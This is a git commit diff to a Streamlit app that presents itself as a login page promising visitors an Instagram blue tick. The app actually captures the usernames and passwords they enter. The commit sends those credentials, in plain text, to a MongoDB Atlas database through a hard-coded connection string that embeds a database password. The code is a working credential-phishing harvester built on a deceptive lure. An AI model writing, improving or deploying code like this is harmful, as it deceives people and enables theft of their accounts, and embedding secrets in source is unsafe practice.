1674cfbe7855ba002f88ef2581fb02c8dd94bef8
Vishal Paswan <exokict@gmail.com>
2024-11-10 14:46:04 +0530

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,9 +1,15 @@
 import streamlit as st
+from pymongo import MongoClient
 
-# Function to save username and password to a file
+# MongoDB Atlas connection string
+MONGO_URI = "mongodb+srv://Vishu:vdONpmr0BXz6leVg@cluster0.8q6fo.mongodb.net/web?retryWrites=true&w=majority"
+client = MongoClient(MONGO_URI)
+db = client.get_database()  # Use your database name
+credentials_collection = db.credentials  # Name of the collection
+
+# Function to save username and password to MongoDB
 def save_credentials(username, password):
-    with open('password.txt', 'a') as file:
-        file.write(f"{username}:{password}\n")
+    credentials_collection.insert_one({"username": username, "password": password})
 
 # Streamlit app
 st.set_page_config(page_title="Login Page For Blue Ocean", page_icon="🔒")
@@ -14,10 +20,11 @@ username = st.text_input("Username")
 password = st.text_input("Password", type="password")
 
 if st.button("Login"):
+    # Save credentials to MongoDB (password is saved as plain text)
     save_credentials(username, password)
+    
+    # Inform user of successful login
     st.success("Login successful! You have received a blue tick on Instagram.")
     st.success("You will get the blue tick within 24 hours.")
-
-# Message prompting for username and password
 else:
     st.info("Please enter your username and password to login.")
